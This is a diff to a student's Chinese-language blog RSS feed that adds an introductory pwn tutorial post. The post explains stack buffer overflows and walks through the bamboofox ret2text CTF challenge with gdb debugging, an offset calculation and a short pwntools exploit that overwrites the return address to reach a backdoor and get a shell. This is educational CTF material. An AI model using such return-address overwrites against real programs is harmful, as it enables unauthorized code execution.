@@ -5,8 +5,99 @@
         <link>https://tangzichengcc.github.io</link>
         <description>一名好奇宝宝,网络空间安全在读研究生,CTF爱好者的成长记录</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 04 Oct 2022 20:41:10 +0800</pubDate>
-        <lastBuildDate>Tue, 04 Oct 2022 20:41:10 +0800</lastBuildDate>
+        <pubDate>Tue, 11 Oct 2022 16:49:11 +0800</pubDate>
+        <lastBuildDate>Tue, 11 Oct 2022 16:49:11 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://tangzichengcc.github.io/2022/10/11/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/</guid>
+            <title>pwn入门-1-初识</title>
+            <link>https://tangzichengcc.github.io/2022/10/11/pwn%E5%85%A5%E9%97%A8-1-%E5%88%9D%E8%AF%86/</link>
+            <pubDate>Tue, 11 Oct 2022 16:49:11 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;​	学pwn有一段时间了,反反复复捣鼓一些东西,还是觉得以博客记录比较好,梳理自己的思路,会以第一人称来写,来记录学习的过程和结局思路(不是那种我是老师,教你学, 而是自己在探索.所以可能有时候会比较傻) 基础知识总有书和博客比我写得好,我觉得没有必要造轮子,所以有些基础知识可能会不会写的太细….反之,有一些博客上漏掉的细节,以及解题的关键会重点写(不会吧不会吧,真有人看你博客吗)&lt;/p&gt;
+&lt;p&gt;​	自己曾经说网上99%的博客都是垃圾(包括自己的),希望自己换了新博客后写的能质量高一点(至少越来越有长进)。(笑,不会真有人看你博客吧?)&lt;/p&gt;
+&lt;p&gt;​	第一篇文章首先来简单说一下自己目前认知的pwn&lt;/p&gt;
+&lt;h2 id=&#34;什么是pwn&#34;&gt;&lt;a href=&#34;#什么是pwn&#34; class=&#34;headerlink&#34; title=&#34;什么是pwn?&#34;&gt;&lt;/a&gt;什么是pwn?&lt;/h2&gt;&lt;p&gt;​	简单来说就是二进制漏洞的利用,什么是二进制呢? 这里的二进制指的是二进制程序,也就是我们平常用高级语言编写的程序被编译链接后成为的01010101, 它们在操作系统中运行的时候,会因为操作系统和cpu等设计的问题,以及程序员的问题,出现各种bug,导致漏洞利用.&lt;/p&gt;
+&lt;p&gt;​	最常见的就是溢出类型的漏洞,在CTF中也是最常考察的,栈溢出,堆溢出等,在这之后会有虚拟化逃逸,内核漏洞等.&lt;/p&gt;
+&lt;p&gt;​	“万物皆可pwn”,尤其是现在iot的发展,多种设备都联入网络,像汽车,智能家居,安保系统等,都可能被“pwn“掉&lt;/p&gt;
+&lt;h2 id=&#34;如何入门&#34;&gt;&lt;a href=&#34;#如何入门&#34; class=&#34;headerlink&#34; title=&#34;如何入门?&#34;&gt;&lt;/a&gt;如何入门?&lt;/h2&gt;&lt;p&gt;​	这个问题我没法回答,因为我现在正在入门……….我只能说一些我目前正在做的事情,仅供参考&lt;/p&gt;
+&lt;h3 id=&#34;1-系统地打好计算机基础&#34;&gt;&lt;a href=&#34;#1-系统地打好计算机基础&#34; class=&#34;headerlink&#34; title=&#34;1.系统地打好计算机基础&#34;&gt;&lt;/a&gt;1.系统地打好计算机基础&lt;/h3&gt;&lt;p&gt;​	pwn和web不一样,是比较底层的,需要的计算机知识很多,基础不牢地动山摇,所以要有较好的计算机基础.&lt;/p&gt;
+&lt;p&gt;​	包括但不限于 操作系统、汇编语言、体系结构、编译原理、C语言等&lt;/p&gt;
+&lt;p&gt;​	作者目前研一,还有一段时间用来打基础,建议大家在本科期间就好好打基础呀 (半路出家的痛)&lt;/p&gt;
+&lt;p&gt;​	目前选了学校的一些课程,同时在看一些书和视频等&lt;/p&gt;
+&lt;h4 id=&#34;一-计算机体系结构&#34;&gt;&lt;a href=&#34;#一-计算机体系结构&#34; class=&#34;headerlink&#34; title=&#34;(一)计算机体系结构&#34;&gt;&lt;/a&gt;(一)计算机体系结构&lt;/h4&gt;&lt;p&gt;​	或者说计算机组成原理,是非常非常基础和重要的(本科时候学的太烂的),国科大的胡伟武老师讲这门课(放弃申报院士,为国家做芯片,龙芯董事长,首席科学家!!!! 超级牛的老师)&lt;/p&gt;
+&lt;p&gt;​	这门课能让你懂计算机的运行原理,CPU的原理,计算机是如何工作的,从电路、元器件的原理上去深入理解计算机&lt;/p&gt;
+&lt;p&gt;​	推荐书籍: &lt;/p&gt;
+&lt;p&gt;《计算机体系结构基础 第三版》 胡伟武 这是给国科大的本科生看的,但我觉得不论什么水平看一看都有收获&lt;/p&gt;
+&lt;p&gt;《计算机体系结构 第二版》胡伟武          这是给研究生推荐的教材,可以作为进阶看&lt;/p&gt;
+&lt;p&gt;《深入理解计算机系统》     经典黑书..&lt;/p&gt;
+&lt;h4 id=&#34;二-操作系统&#34;&gt;&lt;a href=&#34;#二-操作系统&#34; class=&#34;headerlink&#34; title=&#34;(二)操作系统&#34;&gt;&lt;/a&gt;(二)操作系统&lt;/h4&gt;&lt;p&gt;​	操作系统可以说&lt;/p&gt;
+&lt;h2 id=&#34;从最简单的一个栈溢出开始了解pwn&#34;&gt;&lt;a href=&#34;#从最简单的一个栈溢出开始了解pwn&#34; class=&#34;headerlink&#34; title=&#34;从最简单的一个栈溢出开始了解pwn&#34;&gt;&lt;/a&gt;从最简单的一个栈溢出开始了解pwn&lt;/h2&gt;&lt;h2 id=&#34;什么是栈&#34;&gt;&lt;a href=&#34;#什么是栈&#34; class=&#34;headerlink&#34; title=&#34;什么是栈?&#34;&gt;&lt;/a&gt;什么是栈?&lt;/h2&gt;&lt;p&gt;​	栈是用来存储用户输入,函数变量,寄存器的值等的一块内存空间,它从高地址向低地址生长&lt;/p&gt;
+&lt;img src=&#34;images/image-20221011171330747.png&#34; alt=&#34;image-20221011171330747&#34; style=&#34;zoom:50%;&#34; /&gt;
+
+&lt;h3 id=&#34;什么是缓冲区溢出&#34;&gt;&lt;a href=&#34;#什么是缓冲区溢出&#34; class=&#34;headerlink&#34; title=&#34;什么是缓冲区溢出?&#34;&gt;&lt;/a&gt;什么是缓冲区溢出?&lt;/h3&gt;&lt;p&gt;​	在上图中, buffer是&lt;font color=&#34;red&#34;&gt;用户能够可控的&lt;/font&gt;,用户能够可控的事实上便不安全,如果没有对buffer的大小进行正确的控制,buffer超过了128字节,则会产生溢出.&lt;/p&gt;
+&lt;p&gt;​	那么产生了溢出又会怎样呢? 先看最直接的效果,buffer的地址是从低地址向高地址生长的,那么它往上溢出,就会覆盖ebp和返回地址,以及等等.&lt;/p&gt;
+&lt;img src=&#34;images/image-20221011171912415.png&#34; alt=&#34;image-20221011171912415&#34; style=&#34;zoom:50%;&#34; /&gt;
+
+&lt;p&gt;​	那么覆盖了又会怎样呢?? 这里就需要了解函数调用的基础了(基础知识很重要!),这里先简单的说,在我们当前这个函数被调用完成,进行return的时候,它会return到哪呢? 就是我们存储的&lt;font color=&#34;red&#34;&gt;返回地址(return address)&lt;/font&gt;,所以,答案就来了,如果我们把返回地址修改为恶意代码的地址,是不是就能够对它进行劫持? 是的,这种手法就叫劫持控制流&lt;/p&gt;
+&lt;h3 id=&#34;一个简单的例子-ret2backdoor-x2F-ret2text&#34;&gt;&lt;a href=&#34;#一个简单的例子-ret2backdoor-x2F-ret2text&#34; class=&#34;headerlink&#34; title=&#34;一个简单的例子, ret2backdoor&amp;#x2F;ret2text&#34;&gt;&lt;/a&gt;一个简单的例子, ret2backdoor&amp;#x2F;ret2text&lt;/h3&gt;&lt;p&gt;题目来源于bamboofox中的ret2text&lt;/p&gt;
+&lt;p&gt;题目链接:&lt;/p&gt;
+&lt;p&gt;​	一般我们拿到的都是二进制文件,没有源代码,但我们不能直接读01吧,读汇编也很难吧(大佬除外),所以我们需要工具来帮我们反编译反汇编,反汇编是把01那些转换成汇编代码,反编译是把汇编转换成高级语言(如c语言)&lt;/p&gt;
+&lt;p&gt;​	这时候我们需要借助一个工具, ida pro, 别的工具也可以,不过ida确实是非常好用啊&lt;/p&gt;
+&lt;p&gt;​	&lt;/p&gt;
+&lt;h4 id=&#34;动态调试&#34;&gt;&lt;a href=&#34;#动态调试&#34; class=&#34;headerlink&#34; title=&#34;动态调试&#34;&gt;&lt;/a&gt;动态调试&lt;/h4&gt;&lt;p&gt;​	啥是动态调试呢? 静态分析是看源程序的汇编代码,程序是死的,动态调试就是让程序跑起来,在程序运行的时候,在某个节点断下来,查看程序的运行时状态,如栈的布局,寄存器等等,来寻找漏洞和探索利用方式,这里同样我们要用一些工具,首先是gdb,gdb本身不是为了漏洞利用而生的,而是给程序员来调试程序用的.&lt;/p&gt;
+&lt;p&gt;​	(这里还需要安装一个插件, gef ,具体安装可以google,有很多安装教程,或者直接看github仓库)   不过,为啥要安插件呢? 因为没插件不好用,插件能够帮你提取重要信息,以及给你增加很多方便漏洞调试的命令.&lt;/p&gt;
+&lt;p&gt;​	我们用 gdb 文件名 来启动调试&lt;/p&gt;
+&lt;p&gt;​	start 从第一条指令开始运行&lt;img src=&#34;/images/image-20221011173542682.png&#34; alt=&#34;image-20221011173542682&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​	ni 一步一步往下执行(遇到函数时不进入,直接执行完)&lt;/p&gt;
+&lt;p&gt;这里我们执行到了gets函数,它就是用来读取我们用户输入的,我们先来随便输入一串a&lt;/p&gt;
+&lt;img src=&#34;images/image-20221011173723873.png&#34; alt=&#34;image-20221011173723873&#34; style=&#34;zoom:50%;&#34; /&gt;
+
+
+
+&lt;p&gt;telescope 查看栈的情况  连续按回车可以一直往下展示栈(其实是重复当前命令)&lt;/p&gt;
+&lt;p&gt;能够看到 esp提示你 0xffffd56c这个位置存储的是这一串a,往下看,确实是,&lt;/p&gt;
+&lt;img src=&#34;images/image-20221011173849858.png&#34; alt=&#34;image-20221011173849858&#34; style=&#34;zoom:50%;&#34; /&gt;
+
+&lt;p&gt;当我们继续往下看的时候,我们看到了ebp&lt;/p&gt;
+&lt;img src=&#34;images/image-20221011173946237.png&#34; alt=&#34;image-20221011173946237&#34; style=&#34;zoom:50%;&#34; /&gt;
+
+
+
+&lt;p&gt;根据我们上面对栈的理解,buf之后是ebp然后是返回地址 (实际上实际情况可能比这还要复杂,暂且这样)&lt;/p&gt;
+&lt;p&gt;所以我们也可以从这里算覆盖地址,用ebp的地址 - 字符串开头,也就是buffer的地址, 就可以算出来要填充的字节数&lt;/p&gt;
+&lt;p&gt;0xffffd5d8 - 0xffffd56c &amp;#x3D; 108 这是到ebp的, 再加上ebp 4个字节,于是就是 112 字节, 然后就是返回地址了&lt;/p&gt;
+&lt;p&gt;那么返回地址我们返回到哪呢? 我们刚才在静态分析的时候已经分析到了存在后门函数,地址是0x804863a,所以我们返回这个后门的地址就可以了!&lt;/p&gt;
+&lt;h4 id=&#34;构造payload与exp&#34;&gt;&lt;a href=&#34;#构造payload与exp&#34; class=&#34;headerlink&#34; title=&#34;构造payload与exp&#34;&gt;&lt;/a&gt;构造payload与exp&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload =  &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  + retaddress&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt;是覆盖缓冲区,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;是覆盖ebp,然后就是返回地址了&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;ret2text&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retaddress = &lt;span class=&#34;number&#34;&gt;0x804863a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = payload =  &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;108&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;  + p32(retaddress)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM&lt;span class=&#34;number&#34;&gt;-24&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-10&lt;/span&gt;-ubuntu:/home/ubuntu/zhan# python3 &lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[!] Could not find executable &lt;span class=&#34;string&#34;&gt;&amp;#x27;ret2text&amp;#x27;&lt;/span&gt; in $PATH, using &lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2text&amp;#x27;&lt;/span&gt; instead&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Starting local process &lt;span class=&#34;string&#34;&gt;&amp;#x27;./ret2text&amp;#x27;&lt;/span&gt;: pid &lt;span class=&#34;number&#34;&gt;16542&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] Switching to interactive mode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;There is something amazing here, &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; you know anything?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Maybe I will tell you next time !$ whoami&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;.py    ret2text  shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;于是我们就拿到权限了!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://tangzichengcc.github.io/2022/10/04/%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/</guid>
             <title>一个新的开始</title>
